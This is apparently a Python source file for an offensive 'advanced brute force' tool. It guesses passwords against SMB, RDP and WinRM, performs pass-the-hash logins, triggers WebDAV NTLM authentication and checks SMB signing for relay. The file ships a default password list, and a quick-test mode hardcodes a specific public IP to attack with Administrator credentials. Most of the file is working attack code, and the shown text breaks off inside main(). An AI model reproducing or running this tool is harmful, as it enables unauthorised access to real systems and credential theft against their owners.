#!/usr/bin/env python3
"""
Advanced Brute Force Tool with NTLM Authentication and SMB Session Hijack
Supports: SMB, RDP, WinRM with proper authentication flows
"""

import argparse
import concurrent.futures
import logging
import random
import socket
import sys
import time
import threading
import os
import json
from datetime import datetime
from typing import Dict, List, Tuple, Optional
from enum import Enum
from dataclasses import dataclass
from colorama import init, Fore, Style

init(autoreset=True)

# ==================== ADVANCED IMPACKET IMPORTS ====================
try:
    from impacket import smbconnection
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.dcerpc.v5 import transport, epm, srvs
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket.examples import secretsdump
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

try:
    from impacket import nmb
    NMB_AVAILABLE = True
except ImportError:
    NMB_AVAILABLE = False

# ==================== NTLM AUTHENTICATION ====================
class NTLMAuthenticator:
    """Handle NTLM authentication for various protocols"""
    
    @staticmethod
    def compute_hashes(password: str) -> Tuple[str, str]:
        """Compute LM and NT hashes from password"""
        try:
            lm_hash = compute_lmhash(password)
            nt_hash = compute_nthash(password)
            return lm_hash.hex(), nt_hash.hex()
        except:
            # Fallback to empty hashes
            return "aad3b435b51404eeaad3b435b51404ee", "31d6cfe0d16ae931b73c59d7e0c089c0"
    
    @staticmethod
    def try_ntlm_auth(target: str, username: str, password: str, 
                     domain: str = "", lm_hash: str = "", nt_hash: str = "") -> Tuple[bool, str]:
        """Generic NTLM authentication test"""
        try:
            # Create SMB connection for NTLM test
            smb = SMBConnection(target, target, timeout=10)
            
            if lm_hash or nt_hash:
                # Use pass-the-hash
                smb.login(username, '', domain, lm_hash, nt_hash)
            else:
                # Use password
                smb.login(username, password, domain)
            
            # Try to list shares to verify
            try:
                shares = smb.listShares()
                share_count = len(shares)
                smb.logoff()
                return True, f"NTLM auth successful - Found {share_count} shares"
            except:
                smb.logoff()
                return True, "NTLM authentication successful"
                
        except SessionError as e:
            error = str(e)
            if "STATUS_LOGON_FAILURE" in error:
                return False, "NTLM authentication failed"
            elif "STATUS_ACCOUNT_LOCKED_OUT" in error:
                return False, "Account locked out"
            elif "STATUS_ACCESS_DENIED" in error:
                return False, "Access denied"
            else:
                return False, f"NTLM error: {error[:100]}"
        except Exception as e:
            return False, f"Connection error: {str(e)}"

# ==================== SMB SESSION HIJACK ====================
class SMBSessionHijack:
    """SMB Session Hijacking and NTLM Relay techniques"""
    
    def __init__(self):
        if not IMPACKET_AVAILABLE:
            raise ImportError("Impacket is required for SMB hijacking")
    
    def check_smb_signing(self, target: str) -> Tuple[bool, str]:
        """Check if SMB signing is required"""
        try:
            smb = SMBConnection(target, target, timeout=5)
            smb.login('', '')
            
            # Check signing status
            signing_required = smb.isSigningRequired()
            smb.logoff()
            
            if signing_required:
                return True, "SMB signing is REQUIRED (cannot relay)"
            else:
                return False, "SMB signing is NOT required (vulnerable to relay)"
                
        except Exception as e:
            return None, f"Failed to check SMB signing: {str(e)}"
    
    def list_smb_sessions(self, target: str, username: str = "", password: str = "") -> List[Dict]:
        """List active SMB sessions on target"""
        sessions = []
        
        try:
            # Connect to IPC$ share
            smb = SMBConnection(target, target, timeout=10)
            
            if username and password:
                smb.login(username, password)
            else:
                # Try null session
                smb.login('', '')
            
            # Connect to IPC$ for session enumeration
            tree_id = smb.connectTree('IPC$')
            
            # Use RPC to enumerate sessions
            # Note: This is simplified - actual implementation requires more RPC calls
            smb.logoff()
            
            return sessions
            
        except Exception as e:
            return sessions
    
    def try_smb_relay(self, target: str, relay_target: str, username: str, 
                     password: str) -> Tuple[bool, str]:
        """Attempt SMB relay attack"""
        # Note: This is a placeholder for SMB relay logic
        # Actual implementation requires full NTLM relay setup
        return False, "SMB relay requires additional setup"

# ==================== WEBDAV NTLM FORCED AUTH ====================
class WebDAVNTLMAttack:
    """WebDAV NTLM Forced Authentication Attack"""
    
    @staticmethod
    def trigger_ntlm_auth(target: str, port: int = 80) -> Tuple[bool, str]:
        """Trigger NTLM authentication via WebDAV"""
        import requests
        from requests_ntlm import HttpNtlmAuth
        
        headers = {
            'User-Agent': 'Microsoft-WebDAV-MiniRedir/10.0.19041',
            'Translate': 'f',
            'Depth': '0',
            'Overwrite': 'F'
        }
        
        try:
            # Try to access WebDAV with NTLM
            url = f"http://{target}:{port}/"
            response = requests.request(
                'PROPFIND',
                url,
                headers=headers,
                timeout=10,
                verify=False
            )
            
            # Check for NTLM challenge
            if 'WWW-Authenticate' in response.headers:
                auth_header = response.headers['WWW-Authenticate']
                if 'NTLM' in auth_header or 'Negotiate' in auth_header:
                    return True, "WebDAV NTLM authentication triggered successfully"
            
            return False, "No NTLM authentication required"
            
        except requests.exceptions.ConnectionError:
            return False, "Connection failed - WebDAV might not be enabled"
        except Exception as e:
            return False, f"WebDAV error: {str(e)}"
    
    @staticmethod
    def capture_ntlm_hash(target: str, attacker_ip: str, port: int = 80) -> str:
        """Set up NTLM hash capture (simplified)"""
        # This would normally set up a listener to capture NTLM hashes
        return f"To capture NTLM hashes, set up listener on {attacker_ip} and trigger auth to {target}:{port}"

# ==================== PROTOCOL HANDLERS ====================
class Protocol(Enum):
    SSH = "ssh"
    WINRM = "winrm"
    RDP = "rdp"
    SMB = "smb"
    SMB_NTLM = "smb_ntlm"
    HTTP = "http"
    WEBDAV = "webdav"
    NTLM_RELAY = "ntlm_relay"
    
    @property
    def default_port(self):
        ports = {
            self.SSH: 22,
            self.WINRM: 5985,
            self.RDP: 3389,
            self.SMB: 445,
            self.SMB_NTLM: 445,
            self.HTTP: 80,
            self.WEBDAV: 80,
            self.NTLM_RELAY: 445
        }
        return ports[self]

class ProtocolHandler:
    """Base protocol handler with enhanced capabilities"""
    
    def __init__(self):
        self.ntlm_auth = NTLMAuthenticator()
    
    @staticmethod
    def check_port(target: str, port: int, timeout: int = 3) -> bool:
        """Enhanced port check with retry"""
        for _ in range(2):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    return True
            except:
                pass
            time.sleep(0.5)
        return False
    
    @staticmethod
    def get_service_info(target: str, port: int) -> Dict:
        """Get detailed service information"""
        info = {
            'port_open': False,
            'banner': '',
            'service_name': 'unknown'
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if sock.connect_ex((target, port)) == 0:
                info['port_open'] = True
                
                # Try to get banner
                sock.send(b"\r\n")
                try:
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    info['banner'] = banner[:500]
                except:
                    pass
                
                # Guess service from port
                service_ports = {
                    22: 'SSH',
                    23: 'Telnet',
                    80: 'HTTP',
                    443: 'HTTPS',
                    445: 'SMB',
                    3389: 'RDP',
                    5985: 'WinRM',
                    5986: 'WinRM HTTPS'
                }
                
                info['service_name'] = service_ports.get(port, f'Port {port}')
            
            sock.close()
            
        except:
            pass
        
        return info

class SMBHandler(ProtocolHandler):
    """Enhanced SMB Handler with NTLM support"""
    
    def __init__(self):
        super().__init__()
        self.available = IMPACKET_AVAILABLE
    
    def try_login(self, target: str, port: int, username: str, 
                  password: str, domain: str = "", 
                  timeout: int = 10) -> Tuple[bool, str]:
        """Attempt SMB login with full authentication flow"""
        if not self.available:
            return False, "Impacket not available for SMB"
        
        try:
            # Create SMB connection with proper parameters
            smb = SMBConnection(target, target, sess_port=port, timeout=timeout)
            
            # Try login with domain if provided
            if domain:
                smb.login(username, password, domain)
            else:
                smb.login(username, password)
            
            # Verify by trying to list shares
            try:
                shares = smb.listShares()
                share_names = []
                for share in shares:
                    try:
                        name = share['shi1_netname'][:-1].decode('utf-8', errors='ignore')
                        share_names.append(name)
                    except:
                        pass
                
                share_count = len(share_names)
                smb.logoff()
                
                if share_count > 0:
                    return True, f"SMB login successful - Found {share_count} shares: {', '.join(share_names[:3])}"
                else:
                    return True, "SMB login successful (no shares accessible)"
                    
            except Exception as e:
                smb.logoff()
                return True, f"SMB login successful (share listing failed: {str(e)[:50]})"
            
        except SessionError as e:
            error = str(e)
            if "STATUS_LOGON_FAILURE" in error:
                return False, "SMB authentication failed (bad credentials)"
            elif "STATUS_ACCOUNT_LOCKED_OUT" in error:
                return False, "SMB account locked out"
            elif "STATUS_ACCESS_DENIED" in error:
                return False, "SMB access denied"
            elif "STATUS_BAD_NETWORK_NAME" in error:
                return False, "SMB bad network name"
            elif "STATUS_INVALID_PARAMETER" in error:
                return False, "SMB invalid parameter"
            else:
                return False, f"SMB error: {error[:100]}"
        except Exception as e:
            return False, f"SMB connection error: {str(e)}"
    
    def try_ntlm_hash(self, target: str, port: int, username: str, 
                     lm_hash: str, nt_hash: str, domain: str = "",
                     timeout: int = 10) -> Tuple[bool, str]:
        """Attempt SMB login with NTLM hashes (pass-the-hash)"""
        if not self.available:
            return False, "Impacket not available for pass-the-hash"
        
        try:
            smb = SMBConnection(target, target, sess_port=port, timeout=timeout)
            
            if domain:
                smb.login(username, '', domain, lm_hash, nt_hash)
            else:
                smb.login(username, '', '', lm_hash, nt_hash)
            
            # Verify connection
            try:
                shares = smb.listShares()
                smb.logoff()
                return True, f"Pass-the-hash successful - Found {len(shares)} shares"
            except:
                smb.logoff()
                return True, "Pass-the-hash successful"
                
        except SessionError as e:
            error = str(e)
            if "STATUS_LOGON_FAILURE" in error:
                return False, "Pass-the-hash failed"
            else:
                return False, f"Pass-the-hash error: {error[:100]}"
        except Exception as e:
            return False, f"Connection error: {str(e)}"

class RDPHandler(ProtocolHandler):
    """Enhanced RDP Handler with multiple authentication methods"""
    
    def try_login(self, target: str, port: int, username: str, 
                  password: str, timeout: int = 10) -> Tuple[bool, str]:
        """Attempt RDP login using multiple methods"""
        
        # Method 1: Direct socket test (basic connectivity)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            if sock.connect_ex((target, port)) == 0:
                # RDP port is open
                sock.close()
                
                # Method 2: Try with xfreerdp if available
                rdp_result = self._try_xfreerdp(target, port, username, password, timeout)
                if rdp_result[0]:
                    return rdp_result
                
                # Method 3: Try with rdesktop
                rdesktop_result = self._try_rdesktop(target, port, username, password, timeout)
                if rdesktop_result[0]:
                    return rdesktop_result
                
                return False, "RDP port open but authentication methods unavailable"
            else:
                return False, "RDP port closed"
                
        except Exception as e:
            return False, f"RDP connection error: {str(e)}"
    
    def _try_xfreerdp(self, target: str, port: int, username: str, 
                      password: str, timeout: int) -> Tuple[bool, str]:
        """Try RDP login using xfreerdp"""
        import subprocess
        
        try:
            cmd = [
                'xfreerdp',
                f'/v:{target}:{port}',
                f'/u:{username}',
                f'/p:{password}',
                '/cert-ignore',
                '/sec:nla',
                f'/timeout:{timeout * 1000}',
                '/log-level:error',
                '+auth-only'  # Only authenticate, don't open GUI
            ]
            
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout + 5
            )
            
            if result.returncode == 0:
                return True, "RDP authentication successful via xfreerdp"
            else:
                error = result.stderr.decode('utf-8', errors='ignore')[:200]
                return False, f"xfreerdp failed: {error}"
                
        except FileNotFoundError:
            return False, "xfreerdp not installed"
        except subprocess.TimeoutExpired:
            return False, "xfreerdp timeout"
        except Exception as e:
            return False, f"xfreerdp error: {str(e)}"
    
    def _try_rdesktop(self, target: str, port: int, username: str, 
                      password: str, timeout: int) -> Tuple[bool, str]:
        """Try RDP login using rdesktop"""
        import subprocess
        
        try:
            # Create connection file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rdp', delete=False) as f:
                f.write(f"full address:s:{target}:{port}\n")
                f.write(f"username:s:{username}\n")
                f.write(f"password:s:{password}\n")
                temp_file = f.name
            
            cmd = [
                'rdesktop',
                '-g', '1x1',  # Minimal window size
                '-T', 'AuthTest',
                '-x', 'l',  # LAN experience
                '-a', '16',  # Color depth
                '-u', username,
                '-p', password,
                f'{target}:{port}',
                '-0'  # Connect to console
            ]
            
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout
            )
            
            os.unlink(temp_file)
            
            # rdesktop returns 0 even on auth failure sometimes
            # Check stderr for specific errors
            stderr = result.stderr.decode('utf-8', errors='ignore').lower()
            if 'authentication error' in stderr or 'logon failure' in stderr:
                return False, "RDP authentication failed"
            elif result.returncode == 0:
                return True, "RDP authentication successful via rdesktop"
            else:
                return False, f"rdesktop error: {stderr[:100]}"
                
        except FileNotFoundError:
            return False, "rdesktop not installed"
        except Exception as e:
            return False, f"rdesktop error: {str(e)}"

class WinRMHandler(ProtocolHandler):
    """Enhanced WinRM Handler"""
    
    def try_login(self, target: str, port: int, username: str, 
                  password: str, timeout: int = 10) -> Tuple[bool, str]:
        """Attempt WinRM login"""
        
        # Method 1: Try with pywinrm if available
        try:
            import winrm
            return self._try_pywinrm(target, port, username, password, timeout)
        except ImportError:
            pass
        
        # Method 2: Try with HTTP basic auth test
        return self._try_http_auth(target, port, username, password, timeout)
    
    def _try_pywinrm(self, target: str, port: int, username: str, 
                     password: str, timeout: int) -> Tuple[bool, str]:
        """Try WinRM with pywinrm library"""
        try:
            import winrm
            
            # Check if it's HTTPS or HTTP
            if port == 5986:
                url = f'https://{target}:{port}/wsman'
            else:
                url = f'http://{target}:{port}/wsman'
            
            session = winrm.Session(
                url,
                auth=(username, password),
                transport='ntlm',
                server_cert_validation='ignore',
                read_timeout_sec=timeout,
                operation_timeout_sec=timeout
            )
            
            # Try simple command
            result = session.run_cmd('echo', ['WinRM-Test'])
            
            if result.status_code == 0:
                return True, f"WinRM login successful - Output: {result.std_out.decode()[:50]}"
            else:
                return False, f"WinRM command failed - Status: {result.status_code}"
                
        except winrm.exceptions.AuthenticationError:
            return False, "WinRM authentication failed"
        except winrm.exceptions.WinRMTransportError as e:
            return False, f"WinRM transport error: {str(e)}"
        except Exception as e:
            return False, f"WinRM error: {str(e)}"
    
    def _try_http_auth(self, target: str, port: int, username: str, 
                       password: str, timeout: int) -> Tuple[bool, str]:
        """Try HTTP authentication (WinRM uses HTTP)"""
        import base64
        import urllib.request
        
        try:
            # Create basic auth header
            auth_string = f"{username}:{password}"
            auth_encoded = base64.b64encode(auth_string.encode()).decode()
            
            headers = {
                'Authorization': f'Basic {auth_encoded}',
                'User-Agent': 'Mozilla/5.0'
            }
            
            url = f'http://{target}:{port}/wsman'
            
            req = urllib.request.Request(url, headers=headers)
            response = urllib.request.urlopen(req, timeout=timeout)
            
            if response.status == 200:
                return True, "HTTP authentication successful (possible WinRM)"
            else:
                return False, f"HTTP authentication failed - Status: {response.status}"
                
        except urllib.error.HTTPError as e:
            if e.code == 401:
                return False, "HTTP authentication required but failed"
            else:
                return False, f"HTTP error: {e.code}"
        except Exception as e:
            return False, f"HTTP connection error: {str(e)}"

# ==================== MAIN BRUTE FORCE ENGINE ====================
@dataclass
class AttackConfig:
    """Configuration for attack"""
    target: str
    username: str
    protocol: Protocol
    port: int = None
    wordlist: str = None
    threads: int = 10
    timeout: int = 10
    delay: float = 0
    jitter: float = 0
    domain: str = ""
    use_ntlm_hash: bool = False
    lm_hash: str = ""
    nt_hash: str = ""
    stop_on_success: bool = True
    output_file: str = "attack_results.json"
    
    def __post_init__(self):
        if self.port is None:
            self.port = self.protocol.default_port

class AdvancedBruteForce:
    """Advanced brute force with multiple techniques"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.results = []
        self.found_credentials = []
        self.stats = {
            'attempts': 0,
            'success': 0,
            'failures': 0,
            'start_time': None,
            'end_time': None
        }
        
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        
        # Setup handlers
        self.handlers = self._setup_handlers()
        
        # Load passwords
        self.passwords = self._load_wordlist()
        
        # Setup logging
        self._setup_logging()
        
        # Display banner
        self._show_banner()
    
    def _setup_handlers(self) -> Dict:
        """Setup protocol handlers"""
        return {
            Protocol.SMB: SMBHandler(),
            Protocol.SMB_NTLM: SMBHandler(),
            Protocol.RDP: RDPHandler(),
            Protocol.WINRM: WinRMHandler(),
            Protocol.SSH: ProtocolHandler(),  # Placeholder
            Protocol.HTTP: ProtocolHandler(),  # Placeholder
            Protocol.WEBDAV: WebDAVNTLMAttack(),
            Protocol.NTLM_RELAY: SMBSessionHijack() if IMPACKET_AVAILABLE else None
        }
    
    def _load_wordlist(self) -> List[str]:
        """Load passwords from wordlist"""
        passwords = []
        
        if self.config.wordlist and os.path.exists(self.config.wordlist):
            try:
                with open(self.config.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            passwords.append(line)
                
                print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords")
            except Exception as e:
                print(f"{Fore.RED}[!] Error loading wordlist: {e}")
                passwords = self._get_default_passwords()
        else:
            passwords = self._get_default_passwords()
        
        return passwords
    
    def _get_default_passwords(self) -> List[str]:
        """Get default test passwords"""
        return [
            "1qaz@WSX3edc",
            "Password123",
            "Admin@123",
            "EGYVPS2022Aa",
            "P@ssw0rd",
            "Welcome1",
            "123456",
            "administrator",
            "letmein",
            "qwerty",
            "abc123",
            "password",
            "admin",
            "12345",
            "12345678",
            "123456789",
            "1234",
            "password123",
            "admin123",
            "Administrator",
            "Admin"
        ]
    
    def _setup_logging(self):
        """Setup logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            handlers=[
                logging.FileHandler('bruteforce_advanced.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def _show_banner(self):
        """Display tool banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║          ADVANCED BRUTE FORCE TOOL v3.0           ║
║       NTLM Auth • SMB Hijack • WebDAV Attack      ║
╚══════════════════════════════════════════════════════════╝
{Fore.YELLOW}
Target: {self.config.target}:{self.config.port}
Protocol: {self.config.protocol.value.upper()}
Username: {self.config.username}
Domain: {self.config.domain if self.config.domain else 'None'}
Threads: {self.config.threads}
Passwords: {len(self.passwords)}
        """
        print(banner)
    
    def _test_connection(self) -> bool:
        """Test connection to target"""
        print(f"{Fore.WHITE}[*] Testing connection to {self.config.target}:{self.config.port}...")
        
        info = ProtocolHandler.get_service_info(self.config.target, self.config.port)
        
        if info['port_open']:
            print(f"{Fore.GREEN}[+] Port {self.config.port} is open")
            print(f"{Fore.GREEN}[+] Service: {info['service_name']}")
            if info['banner']:
                print(f"{Fore.GREEN}[+] Banner: {info['banner'][:100]}")
            return True
        else:
            print(f"{Fore.RED}[!] Port {self.config.port} appears closed")
            response = input(f"{Fore.YELLOW}[?] Continue anyway? (y/N): ").lower()
            return response == 'y'
    
    def _try_credential(self, password: str) -> Dict:
        """Try a single credential"""
        if self.stop_event.is_set():
            return {'success': False, 'reason': 'stopped'}
        
        # Apply delay/jitter
        if self.config.delay > 0:
            time.sleep(self.config.delay)
        if self.config.jitter > 0:
            time.sleep(random.uniform(0, self.config.jitter))
        
        result = {
            'timestamp': datetime.now().isoformat(),
            'target': self.config.target,
            'port': self.config.port,
            'protocol': self.config.protocol.value,
            'username': self.config.username,
            'password': password,
            'domain': self.config.domain,
            'success': False,
            'message': ''
        }
        
        try:
            handler = self.handlers.get(self.config.protocol)
            if not handler:
                result['message'] = f"No handler for protocol {self.config.protocol.value}"
                return result
            
            # Try login based on protocol
            if self.config.protocol in [Protocol.SMB, Protocol.SMB_NTLM]:
                if self.config.use_ntlm_hash:
                    success, message = handler.try_ntlm_hash(
                        self.config.target,
                        self.config.port,
                        self.config.username,
                        self.config.lm_hash,
                        self.config.nt_hash,
                        self.config.domain,
                        self.config.timeout
                    )
                else:
                    success, message = handler.try_login(
                        self.config.target,
                        self.config.port,
                        self.config.username,
                        password,
                        self.config.domain,
                        self.config.timeout
                    )
            elif self.config.protocol == Protocol.WEBDAV:
                success, message = handler.trigger_ntlm_auth(
                    self.config.target,
                    self.config.port
                )
            elif self.config.protocol == Protocol.NTLM_RELAY:
                success, message = handler.check_smb_signing(self.config.target)
            else:
                success, message = handler.try_login(
                    self.config.target,
                    self.config.port,
                    self.config.username,
                    password,
                    self.config.timeout
                )
            
            result['success'] = success
            result['message'] = message
            
            # Update stats
            with self.lock:
                self.stats['attempts'] += 1
                if success:
                    self.stats['success'] += 1
                    self.found_credentials.append({
                        'username': self.config.username,
                        'password': password,
                        'domain': self.config.domain
                    })
                    
                    print(f"\n{Fore.GREEN}[✓] SUCCESS: {self.config.username}:{password}")
                    print(f"    {message}")
                    
                    if self.config.stop_on_success:
                        self.stop_event.set()
                else:
                    self.stats['failures'] += 1
                    
                    # Show progress every 10 attempts
                    if self.stats['attempts'] % 10 == 0:
                        self._show_progress()
                    
                    # Show failure in verbose mode
                    if self.config.verbose:
                        print(f"{Fore.RED}[✗] Failed: {password} - {message}")
        
        except Exception as e:
            result['message'] = f"Error: {str(e)}"
            with self.lock:
                self.stats['attempts'] += 1
                self.stats['failures'] += 1
        
        self.results.append(result)
        return result
    
    def _show_progress(self):
        """Show progress bar"""
        total = len(self.passwords)
        attempted = self.stats['attempts']
        percent = (attempted / total) * 100 if total > 0 else 0
        
        bar_length = 40
        filled = int(bar_length * attempted // total)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        print(f"{Fore.CYAN}[*] Progress: |{bar}| {percent:.1f}% ({attempted}/{total}) | "
              f"Success: {self.stats['success']}", end='\r')
    
    def run(self, verbose: bool = False):
        """Run the brute force attack"""
        self.config.verbose = verbose
        
        # Test connection first
        if not self._test_connection():
            print(f"{Fore.RED}[!] Cannot proceed without connection")
            return
        
        print(f"\n{Fore.YELLOW}[*] Starting attack...")
        self.stats['start_time'] = time.time()
        
        # Use thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for password in self.passwords:
                if self.stop_event.is_set():
                    break
                
                future = executor.submit(self._try_credential, password)
                futures.append(future)
            
            # Wait for completion
            try:
                for future in concurrent.futures.as_completed(futures):
                    if self.stop_event.is_set():
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Interrupted by user")
                self.stop_event.set()
                executor.shutdown(wait=False, cancel_futures=True)
        
        # Finish
        self.stats['end_time'] = time.time()
        self._print_summary()
        self._save_results()
    
    def _print_summary(self):
        """Print attack summary"""
        duration = self.stats['end_time'] - self.stats['start_time']
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}[*] ATTACK SUMMARY")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"{Fore.WHITE}Target: {self.config.target}:{self.config.port}")
        print(f"Protocol: {self.config.protocol.value.upper()}")
        print(f"Username: {self.config.username}")
        if self.config.domain:
            print(f"Domain: {self.config.domain}")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Attempts: {self.stats['attempts']}")
        print(f"Success Rate: {self.stats['success']}/{self.stats['attempts']}")
        
        if duration > 0:
            print(f"Rate: {self.stats['attempts']/duration:.2f} attempts/second")
        
        # Show found credentials
        if self.found_credentials:
            print(f"\n{Fore.GREEN}[✓] CREDENTIALS FOUND:")
            for cred in self.found_credentials:
                if cred['domain']:
                    print(f"  {cred['domain']}\\{cred['username']}:{cred['password']}")
                else:
                    print(f"  {cred['username']}:{cred['password']}")
        else:
            print(f"\n{Fore.RED}[✗] No credentials found")
        
        print(f"{Fore.CYAN}{'='*60}")
    
    def _save_results(self):
        """Save results to file"""
        output = {
            'config': {
                'target': self.config.target,
                'protocol': self.config.protocol.value,
                'port': self.config.port,
                'username': self.config.username,
                'domain': self.config.domain,
                'threads': self.config.threads,
                'timeout': self.config.timeout
            },
            'stats': self.stats,
            'found_credentials': self.found_credentials,
            'all_results': self.results
        }
        
        try:
            with open(self.config.output_file, 'w') as f:
                json.dump(output, f, indent=2, default=str)
            print(f"{Fore.GREEN}[+] Results saved to {self.config.output_file}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error saving results: {e}")

# ==================== INTERACTIVE MENU ====================
def interactive_menu():
    """Interactive menu for attack configuration"""
    
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║           SELECT ATTACK TYPE           ║
╚══════════════════════════════════════════════════════════╝
{Fore.YELLOW}
1. Standard Brute Force (Password guessing)
2. NTLM Hash Attack (Pass-the-Hash)
3. WebDAV NTLM Forced Authentication
4. SMB Session Hijack Check
5. NTLM Relay Attack Setup

{Fore.CYAN}0. Exit
{Fore.CYAN}{'='*60}
    """)
    
    while True:
        choice = input(f"{Fore.YELLOW}[?] Select attack type (1-5): ").strip()
        
        if choice == '0':
            print(f"{Fore.YELLOW}[*] Exiting...")
            sys.exit(0)
        
        if choice in ['1', '2', '3', '4', '5']:
            return int(choice)
        
        print(f"{Fore.RED}[!] Invalid choice")

def get_attack_config(attack_type: int) -> AttackConfig:
    """Get configuration based on attack type"""
    
    print(f"\n{Fore.YELLOW}[*] Attack Configuration")
    print(f"{Fore.CYAN}{'-'*60}")
    
    # Common parameters
    target = input(f"{Fore.WHITE}[?] Target IP/Hostname: ").strip()
    username = input(f"{Fore.WHITE}[?] Username: ").strip()
    domain = input(f"{Fore.WHITE}[?] Domain (optional): ").strip()
    
    if attack_type == 1:  # Standard brute force
        protocol_choice = input(f"{Fore.WHITE}[?] Protocol (smb/rdp/winrm/webdav): ").strip().lower()
        protocol_map = {
            'smb': Protocol.SMB,
            'rdp': Protocol.RDP,
            'winrm': Protocol.WINRM,
            'webdav': Protocol.WEBDAV
        }
        protocol = protocol_map.get(protocol_choice, Protocol.SMB)
        
        port_input = input(f"{Fore.WHITE}[?] Port (default {protocol.default_port}): ").strip()
        port = int(port_input) if port_input.isdigit() else protocol.default_port
        
        wordlist = input(f"{Fore.WHITE}[?] Wordlist path (Enter for default): ").strip()
        
        config = AttackConfig(
            target=target,
            username=username,
            domain=domain,
            protocol=protocol,
            port=port,
            wordlist=wordlist if wordlist and os.path.exists(wordlist) else None
        )
    
    elif attack_type == 2:  # NTLM Hash Attack
        lm_hash = input(f"{Fore.WHITE}[?] LM Hash (optional): ").strip()
        nt_hash = input(f"{Fore.WHITE}[?] NT Hash: ").strip()
        
        if not nt_hash:
            print(f"{Fore.RED}[!] NT Hash is required for pass-the-hash")
            sys.exit(1)
        
        config = AttackConfig(
            target=target,
            username=username,
            domain=domain,
            protocol=Protocol.SMB_NTLM,
            port=445,
            use_ntlm_hash=True,
            lm_hash=lm_hash,
            nt_hash=nt_hash
        )
    
    elif attack_type == 3:  # WebDAV NTLM
        port_input = input(f"{Fore.WHITE}[?] WebDAV Port (default 80): ").strip()
        port = int(port_input) if port_input.isdigit() else 80
        
        config = AttackConfig(
            target=target,
            username=username,
            domain=domain,
            protocol=Protocol.WEBDAV,
            port=port
        )
    
    elif attack_type == 4:  # SMB Session Hijack
        config = AttackConfig(
            target=target,
            username=username,
            domain=domain,
            protocol=Protocol.NTLM_RELAY,
            port=445
        )
    
    elif attack_type == 5:  # NTLM Relay
        relay_target = input(f"{Fore.WHITE}[?] Relay Target IP: ").strip()
        print(f"{Fore.YELLOW}[*] NTLM Relay requires additional setup...")
        config = AttackConfig(
            target=target,
            username=username,
            domain=domain,
            protocol=Protocol.SMB,
            port=445
        )
    
    # Common advanced settings
    threads_input = input(f"{Fore.WHITE}[?] Threads (default 10): ").strip()
    config.threads = int(threads_input) if threads_input.isdigit() else 10
    
    timeout_input = input(f"{Fore.WHITE}[?] Timeout seconds (default 10): ").strip()
    config.timeout = int(timeout_input) if timeout_input.isdigit() else 10
    
    delay_input = input(f"{Fore.WHITE}[?] Delay between attempts (default 0): ").strip()
    config.delay = float(delay_input) if delay_input.replace('.', '').isdigit() else 0.0
    
    jitter_input = input(f"{Fore.WHITE}[?] Jitter (random delay, default 0): ").strip()
    config.jitter = float(jitter_input) if jitter_input.replace('.', '').isdigit() else 0.0
    
    return config

# ==================== QUICK TEST ====================
def quick_test_mode():
    """Quick test mode for immediate testing"""
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}[*] QUICK TEST MODE")
    print(f"{Fore.CYAN}{'='*60}")
    
    target = "138.199.239.20"
    print(f"{Fore.WHITE}[*] Using target: {target}")
    
    # Test SMB first
    print(f"\n{Fore.YELLOW}[1] Testing SMB on port 445...")
    smb_handler = SMBHandler()
    
    test_passwords = ["1qaz@WSX3edc", "Password123", "Admin@123", "administrator", "P@ssw0rd"]
    
    for password in test_passwords:
        print(f"{Fore.WHITE}[*] Trying: Administrator:{password}")
        success, message = smb_handler.try_login(target, 445, "Administrator", password, timeout=5)
        
        if success:
            print(f"{Fore.GREEN}[✓] SUCCESS: {message}")
            return
        else:
            print(f"{Fore.RED}[✗] Failed: {message}")
        
        time.sleep(0.5)
    
    # Test RDP if SMB fails
    print(f"\n{Fore.YELLOW}[2] Testing RDP on port 3389...")
    rdp_handler = RDPHandler()
    
    for password in test_passwords:
        print(f"{Fore.WHITE}[*] Trying: administrator:{password}")
        success, message = rdp_handler.try_login(target, 3389, "administrator", password, timeout=5)
        
        if success:
            print(f"{Fore.GREEN}[✓] SUCCESS: {message}")
            return
        else:
            print(f"{Fore.RED}[✗] Failed: {message}")
        
        time.sleep(0.5)
    
    print(f"\n{Fore.YELLOW}[*] Quick test completed. No valid credentials found.")

# ==================== MAIN ====================
def main():
    """Main function"""
    
    # Check dependencies
    print(f"{Fore.YELLOW}[*] Checking dependencies...")
    
    if not IMPACKET_AVAILABLE:
        print(f"{Fore.RED}[!] Impacket is not installed")
        print(f"{Fore.YELLOW}[*] Install with: pip install impacket")
        response = input(f"{Fore.YELLOW}[?] Continue without Impacket? (some features disabled) (y/N): ").lower()
        if response != 'y':
